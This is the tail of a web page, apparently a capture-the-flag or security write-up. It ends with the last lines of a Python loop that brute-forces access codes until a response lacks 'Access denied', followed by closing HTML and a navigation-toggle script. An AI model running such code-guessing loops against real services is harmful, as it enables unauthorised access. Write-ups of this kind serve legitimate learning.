    if b"Access denied" not in response:
        log.success("Valid code found " + code)
        break
</code></pre></div></div>

			</article>
		</section>

		<script>
			document.getElementById("open-nav").addEventListener("click", function () {
				document.body.classList.toggle("nav-open");
			});
		</script>
	</body>
</html>
